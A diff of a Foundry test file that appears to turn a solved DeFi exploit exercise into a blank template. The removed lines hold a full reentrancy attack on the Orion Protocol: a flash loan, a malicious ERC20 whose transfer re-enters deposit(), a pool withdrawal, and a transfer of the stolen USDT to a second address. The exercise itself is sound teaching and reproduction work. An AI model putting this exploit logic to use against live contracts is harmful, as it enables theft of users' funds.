@@ -68,65 +68,19 @@ contract OrionHack is Test {
 
     }
     function test_exploitOrion() public {
-        // approve token for orion : 
-        console.log("balance hacker before hack ",usdt.balanceOf(address(this)));
-        address(usdt).call(abi.encodeWithSignature("approve(address,uint256)",address(orion),type(uint).max));
-        usdc.approve(address(orion),type(uint).max);
-        // make a deposit for orion protorcol. 
-        orion.depositAsset(address(usdc),uint112(1e5));
-        // get the balance of the orion in  usdt : 
-        flashLoanAmount = usdt.balanceOf(address(orion));
-        // take the flash loan : 
-        pool.swap(0,flashLoanAmount,address(this),bytes("tere"));
-        // another logic : 
-        console.log("balance hacker after hack ",usdt.balanceOf(address(this)));
-        // send usdt to another address : 
-        address hacker2 = address (3252323);
-        address(usdt).call(abi.encodeWithSignature("transfer(address,uint256)",hacker2,usdt.balanceOf(address(this))));
-        console.log("balance hacker real address after hack ",usdt.balanceOf(hacker2));
+        //write your test here ...
+        /////////////////
+        /////////
 
 
 
     }
-    function deposit() public {
-       address(usdt).call(abi.encodeWithSignature("approve(address,uint256)",address(orion),type(uint).max));
-        orion.depositAsset(address(usdt),uint112(usdt.balanceOf(address(this))));
-    }
-    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
-        address[] memory path = new address[] (3);
-        path[0] = address(usdc);
-        path[1] = address(token);
-        path[2] = address(usdt);
-        // call the orion swap : 
-        orion.swapThroughOrionPool(1000,0,path,true);
-        // withdraw from the pool :
-        orion.withdraw(address(usdt),uint112(usdt.balanceOf(address(orion)) - 10));
-        // payback the loan : 
-        uint payback  = flashLoanAmount * 1000 / 997 + 100 ;
-        address(usdt).call(abi.encodeWithSignature("transfer(address,uint256)",address(pool),payback));
 
-    }
 }
 
 // the token that the hacker will create : 
-contract Token is ERC20{
-     ERC20 usdt = ERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    address hacker;
+contract Token is ERC20("token","t"){
+   // implement the test token here ....
 
-    constructor (address hack) ERC20 ("token","t"){
-        hacker = hack;
-        _mint(hacker, 1000000 ether);
-    }
-
-    function transfer(address to, uint amount) public override returns(bool){
-        // implement the logic hack 
-        _balances[msg.sender] -= amount;
-        _balances[to] += amount;
-        if (usdt.balanceOf(hacker) > 100e6) { // 10 * 10^6
-            (bool ok,)= hacker.call(abi.encodeWithSignature("deposit()"));
-            require(ok,"fail in transfer token");
-        }
-        return true;
-
-    } 
+   constructor(address a) {}
 }
